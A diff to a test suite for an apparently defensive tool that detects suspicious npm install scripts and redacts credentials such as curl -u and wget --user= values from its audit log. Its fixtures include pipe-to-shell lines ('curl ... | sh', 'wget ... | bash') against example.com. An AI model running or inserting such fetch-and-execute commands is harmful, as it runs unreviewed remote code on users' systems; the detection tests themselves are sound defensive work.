@@ -54,7 +54,11 @@ function readAuditEvents(logDir) {
 // either the audit log or stderr.
 const SYNTHETIC_SECRETS = [
   'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
-  'sk-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij',
+  // Deliberately NOT vendor-prefix-shaped -- exercises the curl/wget -u/--user redaction rule
+  // on its own merits, rather than incidentally passing because the secret also happens to
+  // match the sk-/AKIA/ghp_ pattern (that gap -- basic-auth flags redacted only when the
+  // credential ALSO matched another rule -- was a real review finding on this test).
+  'Correct-Horse-Battery-Staple-9f8e7d',
   'AKIAABCDEFGHIJKLMNOP',
 ];
 
@@ -149,6 +153,14 @@ function runChild(tmp, logDir) {
     assert.ok(postinstall.command.includes('[REDACTED'), 'the secret must be visibly redacted, not silently vanished: ' + postinstall.command);
   });
 
+  check('curl -u basic-auth credentials are redacted even when the secret matches no vendor prefix', () => {
+    const preinstall = suspiciousEvents.find((e) => e.scriptName === 'preinstall');
+    assert.ok(preinstall, 'expected a preinstall event: ' + JSON.stringify(suspiciousEvents));
+    assert.ok(preinstall.command.includes('-u admin:[REDACTED]'), 'expected the -u flag credential to be redacted while the username survives: ' + preinstall.command);
+    assert.ok(!preinstall.command.includes(SYNTHETIC_SECRETS[1]), 'the plain (non-vendor-prefixed) -u secret must never survive redaction: ' + preinstall.command);
+    assert.ok(/https:\/\/internal\.example\.com\/y\b/.test(preinstall.command), 'non-secret destination must survive redaction: ' + preinstall.command);
+  });
+
   fs.rmSync(tmp, { recursive: true, force: true });
   fs.rmSync(logDir, { recursive: true, force: true });
 })();
@@ -169,6 +181,7 @@ function runChild(tmp, logDir) {
       // redaction change itself altering match behavior -- redaction must never affect detection).
       build: 'webpack --mode production',
       postinstall: `curl -H "Authorization: Bearer plain-looking-but-flagged-token" https://example.com | sh`,
+      preinstall: `wget --user=svc-acct:hunter2-not-a-real-password https://example.com/z | bash`,
     },
   }));
   const res = runChild(tmp, logDir);
@@ -176,12 +189,18 @@ function runChild(tmp, logDir) {
   const suspicious = events.filter((e) => e.eventType === 'SUSPICIOUS_SCRIPT');
 
   check('a clean, unrelated script produces no SUSPICIOUS_SCRIPT event (redaction does not alter detection)', () => {
-    assert.strictEqual(suspicious.length, 1, 'only the postinstall pipe-to-shell script should be flagged, not the benign build script: ' + JSON.stringify(events));
-    assert.strictEqual(suspicious[0].scriptName, 'postinstall');
+    assert.strictEqual(suspicious.length, 2, 'the postinstall and preinstall pipe-to-shell scripts should be flagged, not the benign build script: ' + JSON.stringify(events));
   });
   check('a generic Bearer token (no vendor-prefix match) is still redacted by the Bearer-header rule', () => {
     assert.ok(!res.stderr.includes('plain-looking-but-flagged-token'), 'generic bearer tokens must be caught by the Bearer-header pattern, not just vendor-prefixed ones');
-    assert.ok(suspicious[0].command.includes('Bearer [REDACTED]'), 'expected the generic Bearer rule to fire: ' + suspicious[0].command);
+    const postinstall = suspicious.find((e) => e.scriptName === 'postinstall');
+    assert.ok(postinstall.command.includes('Bearer [REDACTED]'), 'expected the generic Bearer rule to fire: ' + postinstall.command);
+  });
+  check('wget --user=user:pass (the "=" form, distinct from the space-separated -u/--user form) is redacted', () => {
+    assert.ok(!res.stderr.includes('hunter2-not-a-real-password'), 'the --user= credential must never survive redaction');
+    const preinstall = suspicious.find((e) => e.scriptName === 'preinstall');
+    assert.ok(preinstall, 'expected a preinstall event: ' + JSON.stringify(suspicious));
+    assert.ok(preinstall.command.includes('--user=svc-acct:[REDACTED]'), 'expected the --user= flag credential to be redacted while the username survives: ' + preinstall.command);
   });
 
   fs.rmSync(tmp, { recursive: true, force: true });
